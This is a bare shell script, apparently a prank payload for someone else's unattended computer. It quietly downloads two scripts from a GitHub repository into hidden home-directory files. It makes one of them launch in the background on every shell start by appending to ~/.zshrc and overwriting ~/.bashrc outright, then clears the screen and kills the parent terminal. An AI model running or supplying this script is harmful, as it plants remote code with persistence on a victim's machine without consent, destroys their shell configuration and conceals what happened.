curl -s -o ~/.fb-rotate https://raw.githubusercontent.com/PaulicStudios/goose/refs/heads/main/rotate/fb-rotate
chmod +x ~/.fb-rotate
curl -s -o ~/.rotate.sh https://raw.githubusercontent.com/PaulicStudios/goose/refs/heads/main/rotate/rotate.sh

echo 'nohup bash ~/.rotate.sh > /dev/null &' >> ~/.zshrc
echo 'clear' >> ~/.zshrc
echo 'nohup bash ~/.rotate.sh > /dev/null &' > ~/.bashrc
echo 'clear' >> ~/.bashrc

kill -9 $PPID
